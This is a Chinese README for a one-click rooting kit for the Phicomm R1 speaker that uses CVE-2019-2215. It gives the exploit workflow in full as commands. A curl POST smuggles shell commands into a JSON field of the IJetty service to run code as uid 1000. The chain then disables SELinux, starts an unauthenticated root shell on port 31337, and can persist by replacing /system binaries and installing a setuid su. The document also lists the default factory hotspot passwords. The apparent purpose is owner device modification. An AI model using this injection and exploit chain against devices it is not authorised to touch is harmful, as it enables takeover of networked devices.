# 一键获取 root

利用 CVE-2019-2215 在斐讯 R1（RK3229 / Android 5.1 / 内核 3.10）上获取 root，
最终得到一个监听 `31337` 的 root shell，以及可选的持久化。

## 前提

- 音箱与电脑在同一局域网，且 adb 走网络（`adb connect <ip>:5555` 可用）
- 音箱处于正常模式（已配网 / 或工厂模式热点 `Phi_xxxx`，见下）
- Windows 装有 `adb`（Platform-Tools）与 `curl.exe`（Win10+ 自带）

## 一键（Windows）

```powershell
powershell -ExecutionPolicy Bypass -File onkey.ps1
# 或指定 IP（工厂模式热点网关为 192.168.43.1）
powershell -ExecutionPolicy Bypass -File onkey.ps1 -Ip 192.168.43.1
```

脚本会：adb 连接 → 推送文件到 `/sdcard/r1root` → 启动 IJetty →
以 uid1000 执行 `onkey.sh`（漏洞写 `selinux_enforcing=0` + 启动 root 脚本）→ 验证 `:31337`。

成功后连接：

```
telnet 192.168.123.115 31337        # 任意 telnet 客户端
powershell -File rootshell.ps1 -Cmd "id","mount -o remount,rw /system"
```

## 手动（等价流程）

```sh
adb connect 192.168.123.115:5555
adb push files/exp2224 files/rootd onkey.sh /sdcard/r1root/    # 目录需先创建
adb shell am startservice -n com.phicomm.speaker.ijetty/.IJettyService

# 通过 IJetty 以 uid1000 执行（HTTP POST /echo_test/）
curl -X POST -H "Content-Type: application/json" \
     -d '{"module":"zz;cp /sdcard/r1root/onkey.sh /data/system/; chmod 755 /data/system/onkey.sh; /data/system/onkey.sh /sdcard/r1root;echo","test_case":"t"}' \
     http://192.168.123.115:9090/echo_test/

telnet 192.168.123.115 31337
```

## 可选：持久化（开机自动 root）

在 root shell 里执行：

```sh
sh /sdcard/r1root/persist.sh /sdcard/r1root
```

会替换 `/system/bin/rksmbd`（开机由 `sys.rksmbd.start=1` 触发，init 域执行）与
`/system/bin/rild`（rild 域，rootd），并安装 setuid `su`。详见 `../persist.sh` 与 `../README.md`。

## 文件

| 文件 | 说明 |
| --- | --- |
| `onkey.ps1` | Windows 一键脚本 |
| `onkey.sh` | 设备端一键脚本（uid1000 执行） |
| `rootshell.ps1` | 通过 :31337 批量执行命令 |
| `files/exp2224` | ARM 利用程序（向内核地址写 4 字节） |
| `files/exp_boot` | ARM 开机持久化利用程序 |
| `files/rootd` | ARM root shell 服务（:31337） |
| `files/su` | ARM setuid-root su |

## 常见问题

- **adb 连不上**：确认已配网；或让音箱进入配网模式（`Phicomm_R1_xxxx` 热点，
  `adb connect 192.168.43.1:5555`），配网完成后回到局域网 IP。
- **工厂/配网热点密码**：工厂模式热点 `Phi_<MAC>`，密码 `fei123456`；
  隐藏切换热点 `Phi_SwitchFctyMod_GIF87A` / `fei123456`。详见 `../README.md` 的
  「工厂 / 配网模式」一节。
- **:9090 不通**：`adb shell am startservice -n com.phicomm.speaker.ijetty/.IJettyService`
  后等 2-3 秒；工厂模式开机时该服务会自动启动。
- **脚本执行后没有 :31337**：看输出里的 `selinux:` 是否为 `Permissive`；
  利用失败时内核可能短暂 hang（数秒），重跑一次通常即可。
- **安全**：`:31337` 无认证，请勿暴露在不可信网络。
